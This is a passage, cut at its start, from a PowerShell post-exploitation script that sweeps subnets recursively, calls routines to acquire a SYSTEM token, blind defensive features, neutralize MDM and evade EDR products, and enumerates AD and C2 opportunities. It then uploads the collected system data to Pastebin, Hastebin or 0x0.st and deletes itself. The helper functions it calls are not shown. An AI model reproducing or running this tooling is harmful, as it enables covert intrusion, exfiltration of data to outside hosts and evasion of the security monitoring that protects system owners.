    
    # Continuous EDR detection and evasion before each enumeration
    if (-not $SkipEDR) {
        $edrProducts = Detect-EDR
        if ($edrProducts.Count -gt 0) {
            Add-EnumData "EDR EVASION" "Detected EDR at depth $CurrentDepth : $($edrProducts -join ', ') - Applying evasion techniques"
            Apply-EDREvasion -EDRProducts $edrProducts
        }
    }
    
    # Perform network scan
    $subnet = $StartIP -replace '\.\d+$', ''
    for ($i = 1; $i -le 254; $i++) {
        $targetIP = "$subnet.$i"
        try {
            $result = Test-Connection -ComputerName $targetIP -Count 1 -Quiet -TimeoutSeconds 1
            if ($result) {
                Add-EnumData "NETWORK DISCOVERY" "Found host: $targetIP (Depth $CurrentDepth)"
                
                # Try to enumerate from discovered host
                if ($CurrentDepth -lt $MaxDepth) {
                    Discover-NetworkRecursive -StartIP $targetIP -CurrentDepth ($CurrentDepth + 1) -MaxDepth $MaxDepth
                }
            }
        } catch { }
    }
}

# Function to upload to Pastebin
function Upload-ToPastebin {
    param([string]$Password)
    
    Update-Progress -Percent 95 -Message "Uploading to Pastebin"
    
    $data = $enumData.raw_data
    $pastebinUrl = $null
    
    # Try Pastebin first
    try {
        $apiKey = "YOUR_PASTEBIN_API_KEY"  # User should set this
        $body = @{
            api_dev_key = $apiKey
            api_option = "paste"
            api_paste_code = $data
            api_paste_private = "2"  # Unlisted
            api_paste_name = "System Enumeration - $(Get-Date -Format 'yyyy-MM-dd')"
            api_paste_expire_date = "1M"
            api_paste_format = "text"
            api_paste_password = $Password
            api_user_key = ""
        }
        
        $response = Invoke-RestMethod -Uri "https://pastebin.com/api/api_post.php" -Method Post -Body $body
        if ($response -notmatch "Bad API request" -and $response -match "^http") {
            $pastebinUrl = $response
        }
    } catch {
        Write-Host "[-] Pastebin upload failed, trying fallback services..." -ForegroundColor Yellow
    }
    
    # Fallback to Hastebin
    if (-not $pastebinUrl) {
        try {
            $response = Invoke-RestMethod -Uri "https://hastebin.com/documents" -Method Post -Body $data -ContentType "text/plain"
            $pastebinUrl = "https://hastebin.com/$($response.key)"
        } catch {
            Write-Host "[-] Hastebin upload failed" -ForegroundColor Red
        }
    }
    
    # Fallback to 0x0.st
    if (-not $pastebinUrl) {
        try {
            $response = Invoke-RestMethod -Uri "https://0x0.st" -Method Post -InFile ([System.Text.Encoding]::UTF8.GetBytes($data))
            $pastebinUrl = $response.Trim()
        } catch {
            Write-Host "[-] 0x0.st upload failed" -ForegroundColor Red
        }
    }
    
    if ($pastebinUrl) {
        Write-Host "`n[+] Enumeration data uploaded successfully!" -ForegroundColor Green
        Write-Host "[+] URL: $pastebinUrl" -ForegroundColor Green
        Write-Host "[+] Password: $Password" -ForegroundColor Yellow
        Write-Host "`nPress any key to continue and delete this script..."
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        
        # Self-delete
        $scriptPath = $MyInvocation.PSCommandPath
        Start-Sleep -Seconds 2
        Remove-Item -Path $scriptPath -Force
    } else {
        Write-Host "[-] Failed to upload to any service" -ForegroundColor Red
    }
}

# Main execution
Write-Host "=== Windows System Enumerator (PowerShell) ===" -ForegroundColor Cyan
Write-Host "Starting comprehensive enumeration...`n" -ForegroundColor Cyan

# Step 1: Acquire SYSTEM token
$tokenAcquired = Acquire-SystemToken

# Step 2: Blind defensive features
if ($tokenAcquired) {
    Blind-DefensiveFeatures
}

# Step 3: Detect and neutralize MDM
if ($tokenAcquired -and -not $SkipMDM) {
    Detect-NeutralizeMDM
}

# Step 4: Detect EDR and apply evasion
if (-not $SkipEDR) {
    $edrProducts = Detect-EDR
    if ($edrProducts.Count -gt 0) {
        Add-EnumData "EDR DETECTION" "Detected EDR products: $($edrProducts -join ', ')"
        Apply-EDREvasion -EDRProducts $edrProducts
    }
}

# Step 5: Comprehensive system enumeration
Enumerate-System

# Step 6: Network enumeration
Enumerate-Network

# Step 7: VLAN enumeration
Enumerate-VLAN

# Step 8: Enhanced enumeration
Enumerate-PostExploitation
Enumerate-ADInfrastructure
Detect-WAF
Enumerate-C2Opportunities
Enumerate-Steganography

# Step 9: Recursive network discovery with continuous EDR evasion
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '^127\.'}).IPAddress | Select-Object -First 1
if ($localIP) {
    Discover-NetworkRecursive -StartIP $localIP -MaxDepth $MaxDepth
}

# Step 10: Upload to Pastebin
Upload-ToPastebin -Password $PastebinPassword

Write-Host "`n[+] Enumeration complete!" -ForegroundColor Green
